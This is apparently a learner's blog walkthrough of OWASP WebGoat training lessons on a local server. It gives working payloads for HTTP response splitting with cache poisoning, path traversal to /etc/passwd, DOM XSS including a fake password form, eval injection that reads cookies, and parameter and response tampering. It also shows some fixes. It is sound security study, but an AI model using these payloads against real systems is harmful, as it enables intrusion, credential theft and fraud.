<p><strong>Concept / Topic To Teach:</strong></p>

<p>This lesson teaches how to perform HTTP Splitting attacks.</p>

<p><strong>How the attack works:</strong></p>

<p>The attacker passes malicious code to the web server together with normal input. A victim application will not be checking for CR (carriage return, also given by %0d or \r) and LF (line feed, also given by %0a or \n) characters. These characters not only give attackers control of the remaining headers and body of the response the application intends to send, but they also allow them to create additional responses entirely under their control.</p>

<p>The effect of an HTTP Splitting attack is maximized when accompanied with a Cache Poisoning. The goal of Cache Poisoning attack is to poison the cache of the victim by fooling the cache into believing that the page hijacked using the HTTP splitting is an authentic version of the server&rsquo;s copy.</p>

<p>The attack works by using the HTTP Splitting attack plus adding the <strong>Last-Modified:</strong> header and setting it to a future date. This forces the browser to send an incorrect <strong>If-Modified-Since</strong> request header on future requests. Because of this, the server will always report that the (poisoned) page has not changed, and the victim&rsquo;s browser will continue to display the attacked version of the page.</p>

<p>A sample of a 304 response is:</p>

<p><em>HTTP/1.1 304 Not Modified</em>
<em>Date: Fri, 30 Dec 2005 17:32:47 GMT</em></p>

<p><strong>My solution</strong></p>

<p><a href="https://www.owasp.org/index.php/HTTP_Response_Splitting"><strong>Stage 1 attack</strong></a></p>

<blockquote><p>HTTP response splitting occurs when:</p>

<ul>
<li>Data enters a web application through an untrusted source, most frequently an HTTP request.</li>
<li>The data is included in an HTTP response header sent to a web user without being validated for malicious characters.</li>
</ul>


<p>HTTP response splitting is a means to an end, not an end in itself. At its root, the attack is straightforward: an attacker passes
malicious data to a vulnerable application, and the application includes the data in an HTTP response header.</p>

<p>To mount a successful exploit, the application must allow input that contains CR (carriage return, also given by %0d or \r) and LF
(line feed, also given by %0a or \n)characters into the header AND the underlying platform must be vulnerable to the injection of such
characters. These characters not only give attackers control of the remaining headers and body of the response the application intends
to send, but also allow them to create additional responses entirely under their control.</p></blockquote>

<p>I entered <code>en%0a</code> in the box and looked at the response headers, which look like this:</p>

<p>HTTP/1.1 302 Moved Temporarily<br/>
Server: Apache-Coyote/1.1<br/>
Location: <a href="http://localhost:8080/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=en%0a  ">http://localhost:8080/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=en%0a  </a>
Content-Type: text/html;charset=ISO-8859-1<br/>
Content-Length: 0<br/>
Date: Fri, 15 Aug 2014 22:01:57 GMT</p>

<p>There is no input sanitization. Note the <strong>Content-Length: 0</strong> header, which signals the end of the first request. After this header, I can add arbitrary headers. For stage 1, it looks like this:</p>

<p>``` plain
Content-Length: 0</p>

<p>HTTP/1.1 200 OK<br/>
Content-Type: text/html<br/>
Content-Length: 50<br/>
<html><body>Stage 1 pwned!</body></html>
```</p>

<p>Just typing the headers in the box won&rsquo;t work for the attack, you have to URL encode it. The encoded version is:</p>

<p><code>Content-Length%3A+0%0D%0A%0D%0AHTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%0D%0AContent-Length%3A+50%0D%0A%3Chtml%3E%3Cbody%3EStage+1+pwned%21%3C%2Fbody%3E%3C%2Fhtml%3E</code>.</p>

<p>That concludes the first part of the attack.</p>

<p><a href="https://www.owasp.org/index.php/Cache_Poisoning"><strong>Stage 2 overview</strong></a></p>

<blockquote><p>The impact of a maliciously constructed response can be magnified if it is cached either by a web cache used by multiple users or even
the browser cache of a single user. If a response is cached in a shared web cache, such as those commonly found in proxy servers, then
all users of that cache will continue to receive the malicious content until the cache entry is purged. Similarly, if the response is
cached in the browser of an individual user, then that user will continue to receive the malicious content until the cache entry is
purged, although only the user of the local browser instance will be affected.</p>

<p>To successfully carry out such an attack, an attacker:</p>

<ul>
<li>Finds the vulnerable service code, which allows them to fill the HTTP header field with many headers.</li>
<li>Forces the cache server to flush its actual cache content, which we want to be cached by the servers.</li>
<li>Sends a specially crafted request, which will be stored in cache.</li>
<li>Sends the next request. The previously injected content stored in cache will be the response to this request.</li>
</ul>


<p>A Cache Poisoning attack is possible because of HTTP Response Splitting and flaws in the web application. It is crucial from the
attacker&rsquo;s point of view that the application allows for filling the header field with more than one header using CR (Carrige Return)
and LF (Line Feed) characters.</p></blockquote>

<p>For the next part, we have to modify the <strong>Last-Modified</strong> header and setting it to a date in the future, to force the browser to cache the malicious page.</p>

<p>``` plain
Content-Length: 0</p>

<p>HTTP/1.1 200 OK<br/>
Content-Type: text/html<br/>
Last-Modified: Mon, 01 Aug 3000 00:00:00 GMT<br/>
Content-Length: 50<br/>
<html><body>Stage 1 pwned!</body></html>
```</p>

<p>Again, URL encode it:</p>

<p><code>Content-Length%3A+0%0D%0A%0D%0AHTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%0D%0ALast-Modified%3A+Mon%2C+01+Aug+3000+00%3A00%3A00+GMT%0D%0AContent-Length%3A+50%0D%0A%3Chtml%3E%3Cbody%3EStage+1+pwned%21%3C%2Fbody%3E%3C%2Fhtml%3E</code></p>

<p>And stage 2 is complete!</p>

<h3>Access Control Flaws</h3>

<p><strong>Using an Access Control Matrix</strong></p>

<p><img class="center" src="/images/webgoat/ac_matrix.png" title="&lsquo;access control matrix&rsquo; &lsquo;access control matrix&rsquo;" ></p>

<p> User Larry [User, Manager] was allowed to access resource Account Manager</p>

<p><strong>Bypass a Path Based Access Control Scheme</strong></p>

<p><img class="center" src="/images/webgoat/bypass_ac.png" title="&lsquo;bypass ac&rsquo; &lsquo;bypass ac&rsquo;" ></p>

<p><strong>Concept / Topic To Teach:</strong></p>

<p>In a path based access control scheme, an attacker can traverse a path by providing relative path information. Therefore an attacker can use relative paths to access files that normally are not directly accessible by anyone, or would otherwise be denied if requested directly.</p>

<p><strong>My solution</strong></p>

<p>Choose a file from the list and intercept the request. Then modify it to access a different file. I changed <code>File=FailOpenAuthentication.html&amp;SUBMIT=View+File</code> to <code>File=../../../../../../../../../etc/passwd&amp;SUBMIT=View+File</code></p>

<p><strong>LAB: Role Based Access Control</strong></p>

<p><img class="center" src="/images/webgoat/rbac_stage1.png" title="&lsquo;bypass rbac&rsquo; &lsquo;bypass rbac&rsquo;" ></p>

<p><strong>Concept / Topic To Teach:</strong></p>

<p>In role-based access control scheme, a role represents a set of access permissions and privileges. A user can be assigned one or more roles. A role-based access control normally consists of two parts: role permission management and role assignment. A broken role-based access control scheme might allow a user to perform accesses that are not allowed by his/her assigned roles, or somehow obtain unauthorized roles.</p>

<p><strong>General Goal(s):</strong></p>

<p>Your goal is to explore the access control rules that govern this site. Each role has permission to certain resources (A-F). Each user is assigned one or more roles. Only the user with the [Admin] role should have access to the &lsquo;F&rsquo; resources. In a successful attack, a who user doesn&rsquo;t have the [Admin] role can access resource F.</p>

<p><strong>Stage 1 Bypass Business Layer Access Control.</strong></p>

<p>I logged in as Tom and looked at the request headers when choosing the action ViewProfile. It looks like this: <code>employee_id=105&amp;action=ViewProfile</code>. So, how might a delete profile action look like? I replayed the request with this very creative modification: <code>employee_id=105&amp;action=DeleteProfile</code>. And that&rsquo;s it for Stage 1!</p>

<p><strong>Stage 2: Add Business Layer Access Control.</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to deny unauthorized access to the Delete function. To do this, you will have to alter the WebGoat code. Once you have done this, repeat stage 1 and verify that access to DeleteProfile functionality is properly denied.</p>

<p>I will skip the exercises that require the developer version, since I&rsquo;m using the standard version.</p>

<p><strong>Stage 3: Bypass Data Layer Access Control</strong></p>

<p>As regular employee &lsquo;Tom&rsquo;, exploit weak access control to View another employee&rsquo;s profile. Verify the access.</p>

<p>This time, modify the <em>employee_id</em> field to view a different profile: <code>employee_id=111&amp;action=ViewProfile</code></p>

<p><strong>Stage 4: Add Data Layer Access Control</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to deny unauthorized access to this data. Once you have done this, repeat stage 3, and verify that access to other employee&rsquo;s profiles is properly denied.</p>

<p><strong>Remote Admin Access</strong></p>

<p><strong>Concept / Topic To Teach:</strong></p>

<p>Applications will often have an administrative interface that allows privileged users access to functionality that normal users shouldn&rsquo;t see. The application server will often have an admin interface as well.</p>

<p><strong>General Goal(s):</strong></p>

<p>Try to access the administrative interface for WebGoat. You may also try to access the administrative interface for Tomcat. The Tomcat admin interface can be accessed via a URL (/admin) and will not count towards the completion of this lesson.</p>

<p>If you look at Admin Functions in the menu, you should only see the Report Card function. Append <code>&amp;admin=true</code> to the URL, and you will see more functions.</p>

<h3>AJAX Security</h3>

<p><strong>Same Origin Policy Protection</strong></p>

<p><img class="center" src="/images/webgoat/sop.png" title="&lsquo;same origin policy&rsquo; &lsquo;same origin policy&rsquo;" ></p>

<p><strong>Concept / Topic To Teach:</strong></p>

<p>A key element of AJAX is the XMLHttpRequest (XHR), which allows javascript to make asynchronous calls from the client side to a server. However, as a security measure these requests may only be made to the server from which the client page originated.</p>

<p>Try the requests for both the same origin and different origin.</p>

<p><strong>LAB: DOM-Based cross-site scripting</strong></p>

<p><strong>Concept / Topic To Teach:</strong></p>

<p>The Document Object Model (DOM) presents an interesting problem from a security standpoint. It allows the content of a web page to be dynamically modified, but that can be abused by attackers during a malicious code injection. XSS, a type of malicious code injection, can occur when unvalidated user input is used directly to modify the content of a page on the client side.</p>

<p><strong>General Goal(s):</strong></p>

<p>For this exercise, your mission is to use this vulnerability to inject malicious code into the DOM. Then in the last stage, you will correct the flaws in the code to address the vulnerability.</p>

<p><img class="center" src="/images/webgoat/img_deface.png" title="&lsquo;dom xss stage 1&rsquo; &lsquo;dom xss stage 1&rsquo;" ></p>

<p>The image location is at <a href="http://localhost:8080/WebGoat/images/logos/owasp.jpg.">http://localhost:8080/WebGoat/images/logos/owasp.jpg.</a> To deface the page, the injection looks like this:</p>

<p><code>html
&lt;img src="images/logos/owasp.jpg"/&gt;
</code></p>

<p>You will notice the Hello message, followed by the OWASP image.</p>

<p><strong>STAGE 2</strong></p>

<p> Now, try to create a JavaScript alert using the image tag</p>

<p>For this attack, we have to use the <em>onerror</em> event, which is triggered if an error occurs when loading an image. And of course, make sure there is no valid image so the error can happen:</p>

<p><code>html
&lt;img src="no img" onerror="alert('There is no image, just XSS')"/&gt;
</code></p>

<p><strong>STAGE 3</strong></p>

<p>Next, try to create a JavaScript alert using the IFRAME tag.</p>

<p>The <em>iframe</em> tag specifies an inline frame, which is used to embed another document within the current HTML document. The attack looks like this:</p>

<p>``` html</p>

<iframe src="javascript:alert('You've been framed!');"></iframe>


<p>```</p>

<p><strong>STAGE 4</strong></p>

<p>Use the following to create a fake login form:</p>

<p><code>plain
Please enter your password:&lt;BR&gt;&lt;input type = "password" name="pass"/&gt;&lt;button onClick="javascript:alert('I have your password: ' + pass.value);"&gt;Submit&lt;/button&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;
</code></p>

<p>Now enter something in the box, and you will see it alerted back.</p>

<p><strong>STAGE 5</strong></p>

<p>Perform client-side HTML entity encoding to mitigate the DOM XSS vulnerability. A utility method is provided for you in escape.js.</p>

<p>Look in the page source for escape.js. Inside you will find the following function:</p>

<p><code>js
function escapeHTML (str) {
   var div = document.createElement('div');
   var text = document.createTextNode(str);
   div.appendChild(text);
   return div.innerHTML;
}
</code></p>

<p>In Firebug, look at DOMXSS.js. We have to modify this function:</p>

<p>``` js
function displayGreeting(name) {</p>

<pre><code>if (name != ''){
    document.getElementById("greeting").innerHTML="Hello, " + name+ "!";
}
</code></pre>

<p>}
```</p>

<p>to use the escapeHTML function on the name parameter:</p>

<p><code>js
document.getElementById("greeting").innerHTML="Hello, " + escapeHTML(name)+ "!";
</code></p>

<p>To make the modification, I edited the Javascript file, located in my WebGoat directory, at <code>tomcat/webapps/WebGoat/javascript</code></p>

<p><strong>LAB: Client Side Filtering</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
It is always a good practice to send to the client only information which they are supposed to have access to. In this lesson, too much information is being sent to the client, creating a serious access control problem.</p>

<p><strong>General Goal(s):</strong>
For this exercise, your mission is exploit the extraneous information being returned by the server to discover information to which you should not have access.</p>

<p><img class="center" src="/images/webgoat/client_filter.png" title="&lsquo;client side filtering&rsquo; &lsquo;client side filtering&rsquo;" ></p>

<p>Inspect the source with Firebug, and you will notice a hidden table called <em>hiddenEmployeeRecords</em>. Look at the last id (112), and you will find out Bartholomew&rsquo;s salary is 450000.</p>

<p><strong>STAGE 2:</strong></p>

<p>Now, fix the problem. Modify the server to only return results that Moe Stooge is allowed to see.</p>

<p>Again, this will require the modification of a file. Look in <code>tomcat/webapps/WebGoat/lessons/Ajax</code>. In the <em>employees.xml</em> file, every employee has a <em>Managers</em> property, that shows which manager should have access over that employee&rsquo;s records. Looking at Neville Bartholomew&rsquo;s profile, we see only he can access his information:</p>

<p>``` xml
<Employee></p>

<pre><code>    &lt;UserID&gt;112&lt;/UserID&gt;
    &lt;FirstName&gt;Neville&lt;/FirstName&gt;
    &lt;LastName&gt;Bartholomew&lt;/LastName&gt;
    &lt;Street&gt;1 Corporate Headquarters&lt;/Street&gt;
    &lt;CS&gt;San Jose, CA&lt;/CS&gt;
    &lt;Phone&gt;408-587-0024&lt;/Phone&gt;
    &lt;StartDate&gt;3012000&lt;/StartDate&gt;
    &lt;SSN&gt;111-111-1111&lt;/SSN&gt;
    &lt;Salary&gt;450000&lt;/Salary&gt;
    &lt;CreditCard&gt;4803389267684109&lt;/CreditCard&gt;
    &lt;Limit&gt;300&lt;/Limit&gt;
    &lt;Comments&gt;&lt;/Comments&gt;
    &lt;DisciplinaryExplanation&gt;&lt;/DisciplinaryExplanation&gt;
    &lt;DisciplinaryDate&gt;112005&lt;/DisciplinaryDate&gt;        
    &lt;Managers&gt;
    &lt;Manager&gt;112&lt;/Manager&gt;
&lt;/Managers&gt;
</code></pre>

<p></Employee>
```</p>

<p>Next, look at <em>clientSideFiltering.jsp</em>. I am not proficient with XPath, but here is the relevant bit:</p>

<p>``` xml
StringBuffer sb = new StringBuffer();</p>

<p>sb.append(&ldquo;/Employees/Employee/UserID | &rdquo;);
sb.append(&ldquo;/Employees/Employee/FirstName | &rdquo;);
sb.append(&ldquo;/Employees/Employee/LastName | &rdquo;);
sb.append(&ldquo;/Employees/Employee/SSN | &rdquo;);
sb.append(&ldquo;/Employees/Employee/Salary &rdquo;);</p>

<p>String expression = sb.toString();
```</p>

<p>We have to change it so the information returned corresponds with the access rights that only managers should have over specific employee records. The filter looks like this:</p>

<p><code>xml
sb.append("/Employees/Employee[Managers/Manager/text() = " + userId + "]/UserID | ");
sb.append("/Employees/Employee[Managers/Manager/text() = " + userId + "]/FirstName | ");
sb.append("/Employees/Employee[Managers/Manager/text() = " + userId + "]/LastName | ");
sb.append("/Employees/Employee[Managers/Manager/text() = " + userId + "]/SSN | ");
sb.append("/Employees/Employee[Managers/Manager/text() = " + userId + "]/Salary ");
</code></p>

<p>If I understand it right, this filter ensures that information is returned only if the user id is present in the Manager node. For example, in Bartholomew&rsquo;s case, it should enforce the fact that only user id 112 can access his records. In other words, only Bartholomew himself can view his information.</p>

<p>For this, I looked at the solution provided by WebGoat, while searching some more about XPath syntax.</p>

<p><strong>DOM Injection</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
How to perform DOM injection attacks.</p>

<p><strong>How the attack works:</strong>
Some applications, especially the ones that use AJAX, manipulate and update the DOM directly using javascript, DHTML and eval() methods.
An attacker may take advantage of that by intercepting the reply and trying to inject some javascript commands to exploit the vulnerabilities.</p>

<p><img class="center" src="/images/webgoat/dom_injection.png" title="&lsquo;dom injection&rsquo; &lsquo;dom injection&rsquo;" ></p>

<p>In Firebug, I just changed the Activate button below:</p>

<p><code>html
&lt;input id="SUBMIT" type="SUBMIT" name="SUBMIT" value="Activate!" disabled=""&gt;
</code></p>

<p>to &ldquo;enabled&rdquo;, then clicked it.</p>

<p><strong>XML Injection</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform XML Injection attacks.</p>

<p><strong>How the attack works:</strong>
AJAX applications use XML to exchange information with the server. This XML can be easily intercepted and altered by a malicious attacker.</p>

<p><img class="center" src="/images/webgoat/xml_injection.png" title="&lsquo;xml injection&rsquo; &lsquo;xml injection&rsquo;" ></p>

<p>When you enter your account id, you will see the rewards that you can claim:</p>

<p>``` plain
Your account balance is now 100 points</p>

<p>Rewards</p>

<p>WebGoat Mug 20 Pts
WebGoat t-shirt 50 Pts
WebGoat Secure Kettle 30 Pts
```</p>

<p>This exercise requires a proxy, so I will use WebScarab to capture the requests and responses. The response from the server contains the following:</p>

<p><code>xml
&lt;root&gt;
&lt;reward&gt;WebGoat Mug 20 Pts&lt;/reward&gt;
&lt;reward&gt;WebGoat t-shirt 50 Pts&lt;/reward&gt;
&lt;reward&gt;WebGoat Secure Kettle 30 Pts&lt;/reward&gt;
&lt;/root&gt;
</code></p>

<p>This means it&rsquo;s only a matter of adding the other rewards to the response, so it becomes this:</p>

<p><code>xml
&lt;root&gt;
&lt;reward&gt;WebGoat t-shirt 20 Pts&lt;/reward&gt;
&lt;reward&gt;WebGoat Secure Kettle 50 Pts&lt;/reward&gt;
&lt;reward&gt;WebGoat Mug 30 Pts&lt;/reward&gt;
&lt;reward&gt;WebGoat Core Duo Laptop 2000 Pts&lt;/reward&gt;
&lt;reward&gt;WebGoat Hawaii Cruise 3000 Pts&lt;/reward&gt;
&lt;/root&gt;
</code></p>

<p>Do that in WebScarab a couple of times and you will see them available on the page. I took the laptop!</p>

<p><strong>JSON Injection</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform JSON Injection Attacks.</p>

<p><strong>How the attack works:</strong>
JavaScript Object Notation (JSON) is a simple and effective lightweight data exchange format. JSON can be in a lot of forms such as arrays, lists, hashtables and other data structures. JSON is widely used in AJAX and Web2.0 applications and is favored by programmers over XML because of its ease of use and speed. However, JSON, like XML, is prone to Injection attacks. A malicious attacker can inject the reply from the server and inject some arbitrary values in there.</p>

<p><img class="center" src="/images/webgoat/json_injection.png" title="&lsquo;json injection&rsquo; &lsquo;json injection&rsquo;" ></p>

<p>Intercept the response and modify the no stops flight in the following JSON to a lower price:</p>

<p><code>json
{
"From": "Boston",
"To": "Seattle",
"flights": [
{"stops": "0", "transit" : "N/A", "price": "$600"},
{"stops": "2", "transit" : "Newark,Chicago", "price": "$300"}
]
}
</code></p>

<p>Then selecy your now very cheap flight and you&rsquo;re done.</p>

<p><strong>Silent Transactions Attacks</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform silent transactions attacks.</p>

<p><strong>How the attack works:</strong>
Any system that silently processes transactions using a single submission is dangerous to the client. For example, if a normal web application allows a simple URL submission, a preset session attack will allow the attacker to complete a transaction without the user&rsquo;s authorization. In Ajax, it gets worse: the transaction is silent; it happens with no user feedback on the page, so an injected attack script may be able to steal money from the client without authorization.</p>

<p><img class="center" src="/images/webgoat/silent.png" title="&lsquo;silent transaction attack&rsquo; &lsquo;silent transaction attack&rsquo;" ></p>

<p>Find the following Javascript code in the source:</p>

<p>`&ldquo; js
function processData(){
 var accountNo = document.getElementById(&lsquo;newAccount&rsquo;).value;
 var amount = document.getElementById(&lsquo;amount&rsquo;).value;
 if ( accountNo == &rdquo;){
 alert(&lsquo;Please enter a valid account number to transfer to.&rsquo;)
 return;
}
 else if ( amount == &lsquo;&rsquo;){
 alert(&lsquo;Please enter a valid amount to transfer.&rsquo;)
 return;
}
 var balanceValue = document.getElementById(&lsquo;balanceID&rsquo;).innerHTML;
 balanceValue = balanceValue.replace( new RegExp(&lsquo;$&rsquo;) , &lsquo;&rsquo;);
 if ( parseFloat(amount) > parseFloat(balanceValue) ) {
 alert(&lsquo;You can not transfer more funds than what is available in your balance.&rsquo;)
 return;
}
 document.getElementById(&lsquo;confirm&rsquo;).value  = &lsquo;Transferring&rsquo;
submitData(accountNo, amount);
 document.getElementById(&lsquo;confirm&rsquo;).value  = &lsquo;Confirm&rsquo;
balanceValue = parseFloat(balanceValue) &ndash; parseFloat(amount);
balanceValue = balanceValue.toFixed(2);
document.getElementById(&lsquo;balanceID&rsquo;).innerHTML = balanceValue + &lsquo;$&rsquo;;
}
function submitData(accountNo, balance) {
var url = &lsquo;attack?Screen=68&amp;menu=400&amp;from=ajax&amp;newAccount=&rsquo;+ accountNo+ &lsquo;&amp;amount=&rsquo; + balance +&lsquo;&amp;confirm=&rsquo; + document.getElementById(&lsquo;confirm&rsquo;).value;
if (typeof XMLHttpRequest != &lsquo;undefined&rsquo;) {
req = new XMLHttpRequest();
} else if (window.ActiveXObject) {
req = new ActiveXObject(&lsquo;Microsoft.XMLHTTP&rsquo;);
   }
   req.open(&lsquo;GET&rsquo;, url, true);
   req.onreadystatechange = callback;
   req.send(null);
}
function callback() {</p>

<pre><code>if (req.readyState == 4) { 
    if (req.status == 200) { 
               var result =  req.responseText ;
         var resultsDiv = document.getElementById('resultsDiv');
            resultsDiv.innerHTML = '';
            resultsDiv.innerHTML = result;
    }}}
</code></pre>

<p>```</p>

<p>The function <em>processData</em> performs some validation, such as correct account number, valid amount and balance. If all is well, it calls <em>submitData</em>, which is the function that does the transaction. The following line is the key to performing the attack:</p>

<p><code>js
var url = 'attack?Screen=68&amp;menu=400&amp;from=ajax&amp;newAccount='+ accountNo+ '&amp;amount=' + balance +'&amp;confirm=' + document.getElementById('confirm').value;
</code></p>

<p>Then all we need to do is construct a URL like that with our chosen parameters:</p>

<p><code><a href="http://localhost:8080/WebGoat/attack?Screen=68&amp;menu=400&amp;from=ajax&amp;newAccount=83&amp;amount=20000&amp;confirm=Confirm">http://localhost:8080/WebGoat/attack?Screen=68&amp;menu=400&amp;from=ajax&amp;newAccount=83&amp;amount=20000&amp;confirm=Confirm</a></code></p>

<p>Another way would be to use Javascript in the browser to call the function <em>submitData</em> directly with arbitrary values:</p>

<p><code>plain
javascript:submitData(83,20000);
</code></p>

<p>In my Firefox version, I couldn&rsquo;t use Javascript from the URL bar, so I used Scratchpad instead from the Web Developer tools.</p>

<p><strong>Dangerous Use of Eval</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
It is always a good practice to validate all input on the server side. XSS can occur when unvalidated user input is reflected directly into an HTTP response. In this lesson, unvalidated user-supplied data is used in conjunction with a Javascript eval() call. In a reflected XSS attack, an attacker can craft a URL with the attack script and store it on another website, email it, or otherwise trick a victim into clicking on it.</p>

<p><img class="center" src="/images/webgoat/eval.png" title="&lsquo;eval danger&rsquo; &lsquo;eval&rsquo;" ></p>

<p>At first I was stuck because I couldn&rsquo;t quite grasp what the code was doing and where was the vulnerability, so I looked at the solution and worked backwards from there, and it became clearer, or at least I think it did.</p>

<p>The first thing I did was look at the <code>eval.js</code> code. And below is the important part.</p>

<p>``` js
http_request.onreadystatechange = function() {
if(http_request.readyState == 4) {
var status = http_request.status;
var responseText = http_request.responseText;</p>

<p>//alert(&lsquo;status: &rsquo; + status);
//alert(&lsquo;responseText: &rsquo; + responseText);</p>

<p>eval(http_request.responseText);</p>

<p>if(responseText.indexOf(&ldquo;&lsquo;);&rdquo;) != -1
&amp;&amp; responseText.indexOf(&ldquo;alert&rdquo;) != -1
&amp;&amp; responseText.indexOf(&ldquo;document.cookie&rdquo;) != -1){</p>

<p>document.form.submit();
}</p>

<p>}
};
```</p>

<p>And in the <code>eval.jsp</code> file:</p>

<p>``` js
String action = request.getParameter(&ldquo;action&rdquo;);
String field1 = request.getParameter(&ldquo;field1&rdquo;);
String field2 = request.getParameter(&ldquo;field2&rdquo;);</p>

<p>if(action == null) action = &ldquo;Purchase&rdquo;;
if(field1 == null) field1 = &ldquo;123&rdquo;;
if(field2 == null) field2 = &ldquo;-1&rdquo;;</p>

<p>/<strong> If they supplied the right attack, pass them </strong>/
if(field1.indexOf(&ldquo;&lsquo;);&rdquo;) != -1 &amp;&amp; field1.indexOf(&ldquo;alert&rdquo;) != -1 &amp;&amp; field1.indexOf(&ldquo;document.cookie&rdquo;) != -1)</p>

<p>{
session.setAttribute(DangerousEval.PASSED, &ldquo;true&rdquo;);
}</p>

<p>out.write(&ldquo;alert(&lsquo;Whoops: You entered an incorrect access code of \&rdquo;&ldquo; + field1 + &rdquo;\&ldquo;&rsquo;);&rdquo;);
```</p>

<p>First, some clarification to help understand the code:</p>

<ul>
<li><p>The <strong>XMLHttpRequest</strong> object is used to exchange data with a server behind the scenes, and it is heavily used in AJAX programming</p></li>
<li><p><strong>responseText</strong> is a property of the <em>XMLHttpRequest</em> object that returns the body of the server&rsquo;s response as a string.</p></li>
<li><p>The <strong>indexOf()</strong> method returns the position of the first occurrence of a specified value in a string. This method returns -1 if the value to search for never occurs. Its syntax is <code>string.indexOf(searchvalue,start)</code>. The second parameter is optional, in case you want to give a position from where to start the search.</p></li>
<li><p><em>field1</em> refers to the box with the 3 digit access code</p></li>
</ul>


<p>In light of this information, let&rsquo;s look again at this code:</p>

<p><code>js
if(field1.indexOf("');") != -1 &amp;&amp; field1.indexOf("alert") != -1 &amp;&amp; field1.indexOf("document.cookie") != -1)
</code></p>

<p>So, this looks in field1, which is the access code, for the occurrence of <code>&lsquo;);</code>, the occurrence of the string &ldquo;alert&rdquo; and the occurrence of &ldquo;document.cookie&rdquo;. And we know what we have to use the vulnerable field to alert the cookie. First, let&rsquo;s see how the value is encapsulated. I passed the value of 12, which wouldn&rsquo;t meet the 3 digit requirement, and this is the popup that I got in return: <code>Whoops: You entered an incorrect access code of &ldquo;12&rdquo;</code></p>

<p>At first, I was like, yeah I got it, and did this:</p>

<p><code>&lsquo;);alert(document.cookie);</code></p>

<p>It didn&rsquo;t work, and I traced the answer of why to this line:</p>

<p><code>js
out.write("alert('Whoops: You entered an incorrect access code of \"" + field1 + "\"');");
</code></p>

<p>This is the alert that we&rsquo;ll have to exploit in order to alert the cookie. I will remove the escaping backslashes for a better visualization below. With the dummy value 12, it looks like this:</p>

<p><code>js
out.write("alert('Whoops: You entered an incorrect access code of ""  12  ""');");
</code></p>

<p>With the failed injection attempt, it looks like this:</p>

<p><code>js
out.write("alert('Whoops: You entered an incorrect access code of ""  12');alert(document.cookie);  ""');");
</code></p>

<p>There is a stray <code>&ldquo;)</code> at the end that is not closed off, breaking the query. To fix that, I adjusted it to:</p>

<p><code>&lsquo;);alert(document.cookie);(&rsquo;</code></p>

<p>Now the injection looks like this:</p>

<p><code>js
out.write("alert('Whoops: You entered an incorrect access code of ""  12');alert(document.cookie);('  ""');");
</code></p>

<p>Breaking it up into pieces:</p>

<p><code>alert(&lsquo;Whoops: You entered an incorrect access code of &ldquo;&rdquo;  12&rsquo;);</code></p>

<p><code>alert(document.cookie);</code></p>

<p><code>(&lsquo;  &ldquo;&rdquo;&rsquo;)</code></p>

<p>Now everything is closed nicely, and the injection succeeds. After the first popup with the <em>Whoops: You entered an incorrect access code of &ldquo;12</em>, you get the second alert with the cookie.</p>

<p>This ended up as a very long explanation, and I hope I got it right. Looking at the solution initially, I had no idea why it worked, but after poring over the code, it became clearer. And all this is possible because the attacker controlled string is passed directly to the <em>eval()</em> function, with no sanitization taking place.</p>

<p><strong>Insecure Client Storage</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
It is always a good practice to validate all input on the server side. Leaving the mechanism for validation on the client side leaves it vulnerable to reverse engineering. Remember, anything on the client side should not be considered a secret.</p>

<p><img class="center" src="/images/webgoat/client_storage.png" title="&lsquo;insecure client storage&rsquo; &lsquo;insecure client storage&rsquo;" ></p>

<p>Look inside <code>clientSideValidation.js</code> for the following:</p>

<p>``` js
var coupons = [&ldquo;nvojubmq&rdquo;,
&ldquo;emph&rdquo;,
&ldquo;sfwmjt&rdquo;,
&ldquo;faopsc&rdquo;,
&ldquo;fopttfsq&rdquo;,
&ldquo;pxuttfsq&rdquo;];</p>

<p>function isValidCoupon(coupon) {
coupon = coupon.toUpperCase();
for(var i=0; i&lt;coupons.length; i++) {
decrypted = decrypt(coupons[i]);
if(coupon == decrypted){
ajaxFunction(coupon);
return true;
}
}
return false; <br/>
}</p>

<p>function decrypt(code){</p>

<p>code = code.toUpperCase();</p>

<p>alpha = &ldquo;ABCDEFGHIJKLMNOPQRSTUVWXYZ&rdquo;;</p>

<p>caesar = &lsquo;&rsquo;;</p>

<p>for (i = code.length ;i >= 0;i&mdash;){</p>

<p>for (j = 0;j&lt;alpha.length;j++){</p>

<p>if(code.charAt(i) == alpha.charAt(j)){</p>

<p>caesar = caesar + alpha.charAt((j+(alpha.length-1))%alpha.length);
}     <br/>
}
} <br/>
return caesar;
}
```</p>

<p>The coupons are encrypted with a Caesar cipher, but we don&rsquo;t have to manually reverse it. I called the <em>decrypt</em> function on one of the coupon values to receive the decrypted result:</p>

<p><code>plain
alert(decrypt("nvojubmq"));
</code></p>

<p>That gave the result PLATINUM.</p>

<p><strong>STAGE 2:</strong> Now, try to get your entire order for free.</p>

<p>Hint: Use Firebug to remove the &ldquo;readonly&rdquo; attribute from the input next to &ldquo;The total charged to your credit card:&rdquo; and set the value to 0.</p>

<p>Just follow the hit, select the element with Firebug, delete the readonly attribute, and set the price to 0. Then purchase stuff for free!</p>

<h3>Authentication Flaws</h3>

<p><strong>Password Strength</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
Accounts are only as secure as their passwords. Most users have the same weak password everywhere. If you want to protect them against brute-force-attacks, your application should have good requirements for passwords. The password should contain lower case letters, capitals and numbers. The longer the password, the better.</p>

<p><img class="center" src="/images/webgoat/pass_stre.png" title="&lsquo;password strength&rsquo; &lsquo;password strength&rsquo;" ></p>

